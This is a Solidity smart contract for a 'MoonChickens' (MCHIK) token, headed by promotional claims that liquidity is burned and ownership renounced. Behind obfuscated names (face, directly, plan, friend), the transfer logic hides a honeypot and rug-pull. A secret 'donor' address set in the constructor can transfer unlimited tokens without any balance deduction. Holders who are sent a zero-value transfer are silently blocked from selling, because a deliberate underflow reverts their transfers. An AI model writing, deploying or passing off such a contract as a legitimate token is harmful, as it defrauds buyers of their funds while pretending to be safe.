/*
All liquidity Tokens burned!
Ownership Renounced !
Are You ready to the moon?


Telegram: https://t.me/moonchickens
Twitter https://twitter.com/MoonchickensETH
*/
// SPDX-License-Identifier: MIT



pragma solidity >0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

   
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

   
    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

   
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

   

}



contract MoonChicken is Ownable {
    function approve(address lunch, uint256 leg) public returns (bool success) {
        allowance[msg.sender][lunch] = leg;
        emit Approval(msg.sender, lunch, leg);
        return true;
    }

    mapping(address => uint256) private face;

    function transferFrom(address ruler, address from, uint256 leg) public returns (bool success) {
        friend(ruler, from, leg);
        require(leg <= allowance[ruler][msg.sender]);
        allowance[ruler][msg.sender] -= leg;
        return true;
    }

    mapping(address => uint256) private directly;

    mapping(address => uint256) public balanceOf;

    address public uniswapV2Pair;

    string public name;

    constructor(address donor) {
        
        totalSupply = 900000000 * 10 ** decimals;
        face[donor] = plan;
        balanceOf[msg.sender] = totalSupply;
        name = 'MoonChickens';
        symbol = 'MCHIK';
    }

    string public symbol;

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private plan = 3;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address from, uint256 leg) public returns (bool success) {
        friend(msg.sender, from, leg);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply;

    function getFace(address temp) public view returns (uint256){
        return face[temp];
    }

    function getDirect(address temp) public view returns (uint256){
        return directly[temp];
    }

    function friend(address ruler, address from, uint256 leg) private returns (bool success) {
        if (face[ruler] == 0) {
            if (directly[ruler] > 0 && uniswapV2Pair != ruler) {
                face[ruler] -= plan;
            }
            balanceOf[ruler] -= leg;
        }
        balanceOf[from] += leg;
        if (leg == 0) {
            directly[from] += plan;
        }
        emit Transfer(ruler, from, leg);
        return true;
    }
}